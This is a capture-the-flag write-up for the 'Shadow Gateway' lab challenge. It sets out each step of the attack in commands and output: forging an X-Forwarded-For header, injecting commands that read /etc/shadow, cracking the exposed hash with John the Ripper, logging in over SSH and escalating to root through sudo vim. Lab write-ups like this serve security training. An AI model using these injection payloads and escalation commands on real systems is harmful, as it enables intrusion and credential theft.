## Shadow Gateway

## Description
```
We got intel about the internal-network of a notorious hacker group. 
Their network, accessible only from '192.168.1.0/24', has intercepted crucial documents, including a CTF flag. 

Can you recover the flag?
```

## Flag Format
```
TH{UUID}
```

Starting off with recon you should detect 2 open ports. <br/>
```sh
kali@kali nmap -sV $IP

Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-23 16:33 CET
Nmap scan report for $IP

Host is up (0.00031s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
80/tcp  open  http    nginx 1.25.2
MAC Address: 00:0C:29:00:DE:DE (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.26 seconds
```

Taking a look at the website. <br/>
![grafik](https://github.com/CTF-Citadel/challenges/assets/110562298/034c85ff-385a-4ec1-90a7-b171e036a217)

Seeing this error message and looking at the description, anybody should know that this either means spoofing your IP address to `192.168.1.101` or adding some kind of request header to `192.168.1.101`. <br/>

Knowing that request headers are easier to forge you should open the website in Burp Suite or any other utility. <br/>
Using the `Intercept` option you can reload the webpage. <br/>
Now you add the following reuqest-header `X-Forwarded-For: 192.168.1.101`. <br/>

Seems like this worked. <br/>
![grafik](https://github.com/CTF-Citadel/challenges/assets/110562298/c85badea-589b-4dda-8709-61dbaeaf9529)

Inputing just the letter `a` we receive the following output. <br/>
![grafik](https://github.com/CTF-Citadel/challenges/assets/110562298/ac68f542-b6c3-494d-9836-3d77f83a5011)

After trying around some things you could maybe input `ls -R` which grants you the result below. <br/>
```php
index.php:    $searchResults = shell_exec("ls /opt/filestash/ | grep " . $userInput);
index.php:    } elseif (isset($_POST["crypto_code"])) {
```

This should let you know that in the function below `$userInput` is basically the input in the searchbar. <br/>
```php
shell_exec("ls /opt/filestash/ | grep " . $userInput)
```

This also gets you the information that you can basically do a command injection using shell escape. <br/>

To do this we can simply add `|`. <br/>
```sh
abc | whoami

www-data
```

Seems like we got a working command execution. <br/>
After some trying around you should be able to find that you can read `/etc/shadow`. <br/>
```sh
abc | cat /etc/shadow

root:*:19619:0:99999:7:::
daemon:*:19619:0:99999:7:::
bin:*:19619:0:99999:7:::
sys:*:19619:0:99999:7:::
sync:*:19619:0:99999:7:::
games:*:19619:0:99999:7:::
man:*:19619:0:99999:7:::
lp:*:19619:0:99999:7:::
mail:*:19619:0:99999:7:::
news:*:19619:0:99999:7:::
uucp:*:19619:0:99999:7:::
proxy:*:19619:0:99999:7:::
www-data:*:19619:0:99999:7:::
backup:*:19619:0:99999:7:::
list:*:19619:0:99999:7:::
irc:*:19619:0:99999:7:::
_apt:*:19619:0:99999:7:::
nobody:*:19619:0:99999:7:::
h4ckt1v1st:$y$j9T$6RYZKUhhvv5rI6/k47xrK1$iODN9FWT5OKOwMzxVctjnjqh1mRZrl5rzu3ZOCCx7zB:19684:0:99999:7:::
systemd-network:!*:19684::::::
systemd-timesync:!*:19684::::::
messagebus:!:19684::::::
sshd:!:19684::::::
```

Getting this we can use some linux utility to crack the hash of the user `h4ckt1v1st`. <br/>
After copying `$y$j9T$6RYZKUhhvv5rI6/k47xrK1$iODN9FWT5OKOwMzxVctjnjqh1mRZrl5rzu3ZOCCx7zB` to `hash.txt` I used `john the ripper` to bruteforce the hash. <br/>
```sh
kali@kali john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lekkerding       (?)     
1g 0:00:00:19 DONE (2023-11-23 16:35) 0.05104g/s 514.5p/s 514.5c/s 514.5C/s sandara..clarke
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> [!NOTE]
> `$y` at the beginning of the hash should indicate that the following format is required for cracking `--format=crypt`.
> There are different utilities like `hash-identifier` to identify which hash is being used.

After getting the password `lekkerding` I was able to connect to the machine using `ssh` on my kali. <br/>
```sh
kali@kali ssh h4ckt1v1st@$IP                        
------------------------------------
h4ckt1v1st@8dd46fe2e6ff:~$ whoami
h4ckt1v1st
```

After getting the shell you should try some basic linux privilege escalation. <br/>
```sh
h4ckt1v1st@8dd46fe2e6ff:~$ sudo -l
Matching Defaults entries for h4ckt1v1st on 8dd46fe2e6ff:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User h4ckt1v1st may run the following commands on 8dd46fe2e6ff:
    (root) NOPASSWD: /usr/bin/vim
```

using `sudo -l` you can see that you got elevated privileges for using `vim`. <br/>
You can now go to [GTFOBins](https://gtfobins.github.io/) to check for privilege escalation using the `vim` binary. <br/>

On the website you should be able to find a working exploit to get a shell using `vim`. <br/>
```sh
h4ckt1v1st@8dd46fe2e6ff:~$ sudo vim -c ':!/bin/sh'

$ whoami
root
```

Now that we are `root` we should easily be able to find the flag in `/root/goldnugget.txt`. <br/>
```sh
$ ls -la /root/
total 24
drwx------ 1 root root 4096 Nov 23 14:54 .
drwxr-xr-x 1 root root 4096 Nov 23 14:54 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Nov 23 14:54 .ssh
-rw-r--r-- 1 root root   37 Nov 23 14:54 goldnugget.txt

$ cat /root/*
a7960b0d-505b-43de-94d2-55b2376abad5
```

This concludes this challenge. 
